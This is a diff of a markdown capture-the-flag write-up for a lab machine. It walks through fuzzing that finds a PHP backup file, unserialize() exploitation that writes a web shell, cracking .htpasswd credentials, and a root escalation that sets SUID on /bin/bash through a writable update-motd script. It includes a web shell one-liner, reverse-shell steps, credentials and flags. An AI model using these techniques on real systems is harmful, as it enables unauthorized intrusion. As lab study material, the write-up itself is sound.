@@ -1,29 +1,29 @@
 ---
 sticker: emoji//1f427
 ---
+# ENUMERATION
+---
 
-# DEBUG
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
+
 
 Let's check the web application first:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407133430.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407133430.png)
 
 Source code is the default one too, we need to fuzz:
 
@@ -55,29 +55,31 @@ backup                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration:
 grid                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 163ms]
 ```
 
+
 We got a `backup` file, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407133732.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407133732.png)
 
 We got the `index.php.bak` file, we can visualize the contents of it in order to check for anything unusual:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407134134.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407134134.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407134241.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407134241.png)
 
 This is highly vulnerable, due to this:
 
-* An attacker can craft a malicious serialized payload and pass it via the `debug` GET parameter (e.g., `?debug=PAYLOAD`).
-* The `unserialize()` function will reconstruct the object, triggering the `__destruct()` method of the `FormSubmit` class (or any other class if gadgets exist).
-* **Arbitrary File Write**: By controlling `$form_file` and `$message`, an attacker could:
-  * Overwrite critical files (e.g., `.htaccess`, `index.php`).
-  * Write a PHP web shell (e.g., `<?php system($_GET['cmd']); ?>`) to gain RCE.
+- An attacker can craft a malicious serialized payload and pass it via the `debug` GET parameter (e.g., `?debug=PAYLOAD`).
+- The `unserialize()` function will reconstruct the object, triggering the `__destruct()` method of the `FormSubmit` class (or any other class if gadgets exist).
+- **Arbitrary File Write**: By controlling `$form_file` and `$message`, an attacker could:
+	- Overwrite critical files (e.g., `.htaccess`, `index.php`).       
+	- Write a PHP web shell (e.g., `<?php system($_GET['cmd']); ?>`) to gain RCE.
+
 
 Knowing this, we can proceed to exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 We can do the following:
 
@@ -116,7 +118,7 @@ Now, use curl to upload the reverse shell:
 curl "http://10.10.109.3/index.php?debug=GENERATED_PAYLOAD"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407135556.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407135556.png)
 
 It will upload the file successfully and we can get the reverse shell by visiting:
 
@@ -124,15 +126,18 @@ It will upload the file successfully and we can get the reverse shell by visitin
 http://TARGET_IP/shell.php
 ```
 
+
 If we check our listener, we get the connection:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407135634.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407135634.png)
 
 Let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 We can begin by stabilizing our shell:
 
@@ -146,11 +151,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407135735.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407135735.png)
 
 We can find this inside of `/var/www/html`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407141523.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407141523.png)
 
 We got a `.htpasswd` file:
 
@@ -177,7 +182,7 @@ We got credentials, let's go into ssh:
 james:jamaica
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407141902.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407141902.png)
 
 ```
 james@osboxes:~$ cat user.txt
@@ -212,9 +217,9 @@ ls -ld /etc/update-motd.d/
 ls -l /etc/update-motd.d/
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407142343.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407142343.png)
 
-We can modify any of these files to add either a reverse shell or create a SUID binary `, let's for example modify the` 99-esm\` file:
+We can modify any of these files to add either a reverse shell or create a SUID binary `, let's for example modify the `99-esm` file:
 
 ```
 chmod u+s /bin/bash
@@ -256,7 +261,7 @@ Once logged use: /bin/bash -p
 
 We can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407143046.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407143046.png)
 
 There we go, we got root, let's read final flag:
 
@@ -265,4 +270,6 @@ bash-4.3# cat /root/root.txt
 3c8c3d0fe758c320d158e32f68fabf4b
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250407143141.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250407143141.png)
+
